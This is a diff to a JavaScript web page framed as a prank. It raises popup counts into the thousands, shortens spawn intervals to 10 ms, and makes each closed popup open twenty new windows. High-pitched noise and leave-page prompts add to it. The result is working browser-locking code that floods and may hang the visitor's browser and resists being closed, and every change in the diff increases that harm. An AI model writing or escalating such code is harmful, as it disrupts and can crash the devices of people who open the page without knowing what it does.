@@ -17,7 +17,7 @@
         const button = document.getElementById('prankButton');
         const music = document.getElementById('music');
         let popupCount = 0;
-        const maxPopups = 200;
+        const maxPopups = 5000;
 
         const popupMessages = [
             "SURPRISE",
@@ -90,9 +90,9 @@
                     return "Are you sure you want to leave?";
                 };
                 
-                // Try to prevent closing and spawn new windows
+                // Try to prevent closing and spawn many new windows
                 popup.onunload = function() {
-                    for(let i = 0; i < 5; i++) {
+                    for(let i = 0; i < 20; i++) {
                         window.open('', '_blank', 'width=400,height=300');
                     }
                 };
@@ -161,8 +161,8 @@
             playHighPitchNoise();
             
             // Create massive amounts of popups
-            for (let i = 0; i < 150; i++) {
-                setTimeout(createPopup, i * 50);
+            for (let i = 0; i < 500; i++) {
+                setTimeout(createPopup, i * 10);
             }
             
             // Create alerts immediately
@@ -173,10 +173,10 @@
                 if (popupCount < maxPopups) {
                     createPopup();
                 }
-            }, 100);
+            }, 10);
             
             // Move popups extremely fast
-            setInterval(movePopups, 20);
+            setInterval(movePopups, 10);
             
             // Change button text
             button.textContent = 'TOO LATE';
